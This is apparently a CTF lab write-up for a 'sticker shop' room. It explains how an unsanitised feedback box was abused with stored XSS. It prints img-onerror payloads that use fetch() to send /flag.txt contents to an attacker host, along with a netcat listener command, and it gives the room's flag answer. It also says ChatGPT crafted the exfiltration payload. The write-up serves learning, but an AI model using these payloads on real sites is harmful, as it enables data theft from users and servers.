![image](https://github.com/user-attachments/assets/c3a16a82-63e5-4467-b055-282e5a2316d5)

____________________________________________________________________________________________________________________ 

This CTF is designed around exploiting a cross-site scripitng vulnerablility within the target's website.

XSS examples learnt from this exercise:

``` <img src = x onerror="fetch('http://attacker_ip:port')"/> ```

``` <img src="x" onerror="fetch('http://victim_ip/file').then(r => r.text()).then(r => fetch('http://attacker_ip:port/?c=' + r))"/> ```

## The sticker shop is finally online!

<details>
<summary> Discovering the XSS Vulnerability </summary>
  <p></p>

____________________________________________________________________________________________________________________  

From exploring the website, which is very bare bones, there is a big customer feedback box which is very badly sanitised.

![image](https://github.com/user-attachments/assets/e58903a5-a95f-4a97-9d01-8af8565dabe2)

We can check for bad sanitisation and whether or not we can abuse it to steal data back to our attacker machine by submitting an xss attack test to the feedback box:

``` <img src = x onerror="fetch('http://attacker_ip:8080')"/> ```

This works as follows:

**img src=x** -> This tries to make the website load an image that doesnt exist, so therefore it throws an error.

**onerror=** -> This defines what to do when the image fails to load and an error is thrown.

**fetch=** -> This makes a network request to the IP/URL in the brackets.

A netcat session can be created to listen for the reply using the following command:

```nc -nvlp 8080```

All together, the text box is fed a request to open an image that doesnt exist. It can't, so it defaults to the error that tells it to send a network request back to the attackers machine. As there is a netcat session listening on the same port, it can recieve a response from the web server, proving there is a vulnerability to be exploited.

![image](https://github.com/user-attachments/assets/da4d8e2a-32b4-43d0-8f0c-07709ef530b5)

____________________________________________________________________________________________________________________ 

</details>

<details>
<summary> Abusing the vulnerability to get the flag </summary>
  <p></p>

____________________________________________________________________________________________________________________ 
  
Knowing this information, I basically fed the question to chatgpt and it provided me a lovely crafted response with additional lines added onto the initial injected code as seen below:

``` <img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.10.239.245:8080/?c=' + r))"/> ```

This is very similar to the previous injection, but this time taking data from the /flag.txt/ directory instead.

This works as Follows:

**.then(r => r.text())** -> This converts the response to text

**.then(r => fetch('http://attacker_ip:8080/?c=' + r))** -> This sends the converted response to the attacker IP who is listening

All together, it makes the web server send a request to itself on its local ip, converts the response it has gathered from the page to text, then sends it to the attacker IP who will be listening again using netcat.

![image](https://github.com/user-attachments/assets/33c82a30-a34c-49fa-bef4-8f333bb41509)

``` Answer = THM{83789a69074f636f64a38879cfcabe8b62305ee6} ```

____________________________________________________________________________________________________________________ 

</details>

